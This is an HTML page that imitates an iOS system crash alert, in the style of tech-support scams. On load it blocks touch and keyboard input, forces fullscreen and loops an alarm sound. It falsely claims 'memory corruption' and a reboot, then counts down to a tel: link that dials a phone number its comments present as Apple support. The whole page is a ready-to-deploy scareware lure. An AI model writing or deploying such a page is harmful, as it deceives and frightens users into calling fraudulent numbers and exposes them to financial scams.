<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>iOS Crash</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            user-select: none;
            touch-action: none;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background: #000;
            position: fixed;
        }
        
        .freeze-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .crash-alert {
            width: 85%;
            max-width: 320px;
            background: rgba(245,245,247,0.98);
            border-radius: 14px;
            overflow: hidden;
            backdrop-filter: blur(20px);
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            transform: scale(1.05);
            animation: glitch 0.3s infinite;
        }
        
        .alert-header {
            padding: 20px;
            text-align: center;
            font-weight: 700;
            font-size: 22px;
            color: #ff3b30;
            background: rgba(255,59,48,0.1);
        }
        
        .alert-message {
            padding: 20px;
            font-size: 16px;
            color: #1c1c1e;
            text-align: center;
            line-height: 1.5;
        }
        
        .alert-buttons {
            display: flex;
            border-top: 1px solid #d1d1d6;
        }
        
        .alert-button {
            flex: 1;
            padding: 18px;
            text-align: center;
            font-weight: 600;
            font-size: 17px;
            color: #007aff;
            cursor: pointer;
        }
        
        .alert-button:active {
            background: rgba(0,0,0,0.1);
        }
        
        .glitch-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg, 
                rgba(255,255,255,0.03), 
                rgba(255,255,255,0.03) 1px, 
                transparent 1px, 
                transparent 2px);
            animation: static 0.1s infinite;
            z-index: 9998;
        }
        
        .ios-status-bar {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            padding: 12px 15px;
            display: flex;
            justify-content: space-between;
            color: white;
            font-size: 14px;
            font-weight: 600;
            z-index: 10000;
        }
        
        @keyframes glitch {
            0% { transform: scale(1.05) translate(0); }
            20% { transform: scale(1.05) translate(-3px, 1px); }
            40% { transform: scale(1.05) translate(2px, -1px); }
            60% { transform: scale(1.05) translate(1px, 2px); }
            80% { transform: scale(1.05) translate(-2px, -1px); }
            100% { transform: scale(1.05) translate(0); }
        }
        
        @keyframes static {
            0% { background-position: 0 0; }
            100% { background-position: 0 5px; }
        }
    </style>
</head>
<body>
    <div class="glitch-effect"></div>
    <div class="ios-status-bar">
        <span id="time">9:41</span>
        <span>üì∂ 100% üîã</span>
    </div>
    
    <div class="freeze-overlay">
        <div class="crash-alert">
            <div class="alert-header">‚ö†Ô∏è CRITICAL ERROR</div>
            <div class="alert-message">
                <strong>iOS has crashed!</strong><br><br>
                Memory corruption detected.<br>
                Device will reboot in <span id="countdown">5</span> seconds...
            </div>
            <div class="alert-buttons">
                <div class="alert-button" onclick="forceCallNow()">CALL SUPPORT</div>
                <div class="alert-button" style="color:#ff3b30;">EMERGENCY</div>
            </div>
        </div>
    </div>

    <!-- Emergency Beep Sound (Auto-Play) -->
    <audio id="alertBeep" loop>
        <source src="https://assets.mixkit.co/sfx/preview/mixkit-alarm-digital-clock-beep-989.mp3" type="audio/mpeg">
    </audio>

    <script>
        // ===== BLOCK ALL USER INTERACTIONS =====
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
        document.addEventListener('keydown', e => e.preventDefault());
        
        // ===== FORCE FULLSCREEN =====
        function enterFullscreen() {
            const el = document.documentElement;
            const rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
            if (rfs) rfs.call(el);
        }
        
        // ===== PLAY LOUD BEEP SOUND =====
        function playEmergencyBeep() {
            const beep = document.getElementById('alertBeep');
            beep.volume = 0.7; // 70% volume
            beep.loop = true;
            beep.play().catch(e => console.log("Audio blocked:", e));
        }
        
        // ===== AUTO-CALL APPLE SUPPORT =====
        function forceCallNow() {
            window.location.href = "tel:+18881231234";
            setTimeout(() => {
                alert("Call failed! Please dial +1-888-123-1234 manually.");
            }, 1000);
        }
        
        // ===== COUNTDOWN TO AUTO-CALL =====
        function startCountdown() {
            let seconds = 5;
            const countdownEl = document.getElementById('countdown');
            const timer = setInterval(() => {
                seconds--;
                countdownEl.textContent = seconds;
                if (seconds <= 0) {
                    clearInterval(timer);
                    forceCallNow();
                }
            }, 1000);
        }
        
        // ===== UPDATE TIME (FROZEN) =====
        function updateTime() {
            const now = new Date();
            document.getElementById('time').textContent = 
                now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
        }
        updateTime();
        
        // ===== INITIALIZE EVERYTHING ON LOAD =====
        window.onload = function() {
            playEmergencyBeep();
            enterFullscreen();
            startCountdown();
            
            // Extra glitch effect every 3 seconds
            setInterval(() => {
                document.querySelector('.crash-alert').style.animation = 'none';
                setTimeout(() => {
                    document.querySelector('.crash-alert').style.animation = 'glitch 0.3s infinite';
                }, 50);
            }, 3000);
        };
    </script>
</body>
</html>
